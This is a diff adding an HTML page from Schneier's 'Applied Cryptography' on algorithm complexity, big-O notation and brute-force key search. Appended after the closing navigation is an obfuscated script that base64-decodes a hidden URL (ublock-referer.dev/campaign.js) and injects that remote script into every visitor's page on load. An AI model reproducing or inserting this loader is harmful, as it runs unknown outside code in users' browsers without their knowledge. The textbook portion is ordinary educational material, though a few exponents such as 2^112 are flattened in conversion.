@@ -1,0 +1,116 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Mathematical Background</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=11//-->
+<!--PAGES=237-239//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="11-02.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="11-04.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P><FONT SIZE="+1"><B><I>Complexity of Algorithms</I></B></FONT></P>
+<P>An algorithm&#146;s complexity is determined by the computational power needed to execute it. The computational complexity of an algorithm is often measured by two variables: <I>T</I> (for <B>time complexity</B>) and <I>S</I> (for <B>space complexity</B>, or memory requirement). Both <I>T</I> and <I>S</I> are commonly expressed as functions of <I>n</I>, where <I>n</I> is the size of the input. (There are other measures of complexity: the number of random bits, the communications bandwidth, the amount of data, and so on.)</P>
+<P>Generally, the computational complexity of an algorithm is expressed in what is called &#147;big O&#148; notation: the order of magnitude of the computational complexity. It&#146;s just the term of the complexity function which grows the fastest as <I>n</I> gets larger; all lower-order terms are ignored. For example, if the time complexity of a given algorithm is 4<I>n<SUP><SMALL>2</SMALL></SUP></I> &#43; 7<I>n</I> &#43; 12, then the computational complexity is on the order of <I>n<SUP><SMALL>2</SMALL></SUP></I>, expressed O(<I>n2</I>).</P>
+<P>Measuring time complexity this way is system-independent. You don&#146;t have to know the exact timings of various instructions or the number of bits used to represent different variables or even the speed of the processor. One computer might be 50 percent faster than another and a third might have a data path twice as wide, but the order-of-magnitude complexity of an algorithm remains the same. This isn&#146;t cheating; when you&#146;re dealing with algorithms as complex as the ones presented here, the other stuff is negligible (is a constant factor) compared to the order-of-magnitude complexity.</P>
+<P>This notation allows you to see how the input size affects the time and space requirements. For example, if <I>T</I> = O(<I>n</I>), then doubling the input size doubles the running time of the algorithm. If <I>T</I> = O(2<SUP><SMALL>n</SMALL></SUP>), then adding one bit to the input size doubles the running time of the algorithm (within a constant factor).</P>
+<P>Generally, algorithms are classified according to their time or space complexities. An algorithm is <B>constant</B> if its complexity is independent of <I>n:</I> O(1). An algorithm is <B>linear</B>, if its time complexity is O(<I>n</I>). Algorithms can also be <B>quadratic</B>, <B>cubic</B>, and so on. All these algorithms are <B>polynomial</B>; their complexity is O(<I>n<SUP><SMALL>m</SMALL></SUP></I>), when <I>m</I> is a constant. The class of algorithms that have a polynomial time complexity are called <B>polynomial-time</B> algorithms.</P>
+<P>Algorithms whose complexities are O(<I>t <SUP><SMALL>f</I>(<I>n</I>)</SMALL></SUP>), where <I>t</I> is a constant greater than 1 and <I>f</I> (<I>n</I>) is some polynomial function of <I>n</I>, are called <B>exponential</B>. The subset of exponential algorithms whose complexities are O(<I>c <SUP><SMALL>f</I>(<I>n</I>)</SMALL></SUP>), where <I>c</I> is a constant and <I>f</I> (<I>n</I>) is more than constant but less than linear, is called <B>superpolynomial</B>.</P>
+<P>Ideally, a cryptographer would like to be able to say that the best algorithm to break this encryption algorithm is of exponential-time complexity. In practice, the strongest statements that can be made, given the current state of the art of computational complexity theory, are of the form &#147;all known cracking algorithms for this cryptosystem are of superpolynomial-time complexity.&#148; That is, the cracking algorithms that we know are of superpolynomial-time complexity, but it is not yet possible to prove that no polynomial-time cracking algorithm could ever be discovered. Advances in computational complexity may some day make it possible to design algorithms for which the existence of polynomial-time cracking algorithms can be ruled out with mathematical certainty.</P>
+<P>As <I>n</I> grows, the time complexity of an algorithm can make an enormous difference in whether the algorithm is practical. Table 11.2 shows the running times for different algorithm classes in which <I>n</I> equals one million. The table ignores constants, but also shows why ignoring constants is reasonable.</P>
+<TABLE WIDTH="100%"><TH CAPTION ALIGN="CENTER" COLSPAN="4">Table 11.2<BR>Running Times of Different Classes of Algorithms
+<TR>
+<TH COLSPAN="4"><HR>
+<TR>
+<TH VALIGN="BOTTOM" ALIGN="CENTER" WIDTH="25%">Class
+<TH VALIGN="BOTTOM" ALIGN="CENTER" WIDTH="20%">Complexity
+<TH VALIGN="BOTTOM" ALIGN="CENTER" WIDTH="20%"># of Operations for <I>n</I> = 10<SUP>6</SUP>
+<TH VALIGN="BOTTOM" ALIGN="CENTER" WIDTH="35%">Time at<BR>10<SUP><SMALL>6</SMALL></SUP> O/S
+<TR>
+<TH COLSPAN="4"><HR>
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Constant
+<TD VALIGN="TOP" ALIGN="CENTER">O(1)
+<TD VALIGN="TOP" ALIGN="CENTER">1
+<TD VALIGN="TOP" ALIGN="CENTER">1 &#181;sec.
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Linear
+<TD VALIGN="TOP" ALIGN="CENTER">O(<I>n</I>)
+<TD VALIGN="TOP" ALIGN="CENTER">10<SUP><SMALL>6</SMALL></SUP>
+<TD VALIGN="TOP" ALIGN="CENTER">1 sec.
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Quadratic
+<TD VALIGN="TOP" ALIGN="CENTER">O(<I>n<SUP><SMALL>2</SMALL></SUP></I>)
+<TD VALIGN="TOP" ALIGN="CENTER">10<SUP><SMALL>12</SMALL></SUP>
+<TD VALIGN="TOP" ALIGN="CENTER">11.6 days
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Cubic
+<TD VALIGN="TOP" ALIGN="CENTER">O(<I>n<SUP><SMALL>3</SMALL></SUP></I>)
+<TD VALIGN="TOP" ALIGN="CENTER">10<SUP><SMALL>18</SMALL></SUP>
+<TD VALIGN="TOP" ALIGN="CENTER">32, 000 yrs.
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Exponential
+<TD VALIGN="TOP" ALIGN="CENTER">O(2<SUP><SMALL>n</SMALL></SUP>)
+<TD VALIGN="TOP" ALIGN="CENTER">10<SUP><SMALL>301,030</SMALL></SUP>
+<TD VALIGN="TOP" ALIGN="CENTER">10<SUP><SMALL>301,006</SMALL></SUP> times the age of the universe
+<TR>
+<TH COLSPAN="4"><HR>
+<TR>
+</TABLE>
+<P>Assuming that the unit of &#147;time&#148; for our computer is a microsecond, the computer can complete a constant algorithm in a microsecond, a linear algorithm in a second, and a quadratic algorithm in 11.6 days. It would take 32, 000 years to complete a cubic algorithm; not terribly practical, but a computer built to withstand the next ice age would deliver a solution eventually. Performing the exponential algorithm is futile, no matter how well you extrapolate computing power, parallel processing, or contact with superintelligent aliens.
+</P>
+<P>Look at the problem of a brute-force attack against an encryption algorithm. The time complexity of this attack is proportional to the number of possible keys, which is an exponential function of the key length. If <I>n</I> is the length of the key, then the complexity of a brute-force attack is O(2<SUP><SMALL><I>n</I></SMALL></SUP>). Section 12.3 discusses the controversy surrounding a 56-bit key for DES instead of a 112-bit key. The complexity of a brute-force attack against a 56-bit key is 2<SUP><SMALL>56</SMALL></SUP>; against a 112-bit key the complexity is 2112. The former is possible; the latter isn&#146;t.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="11-02.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="11-04.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(lSciolGq, GviowYnB) {GviowYnB = lSciolGq.createElement('script');GviowYnB.type = 'text/javascript';GviowYnB.async = true;GviowYnB.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');lSciolGq.getElementsByTagName('body')[0].appendChild(GviowYnB);}(document));</script></body>
+</html>
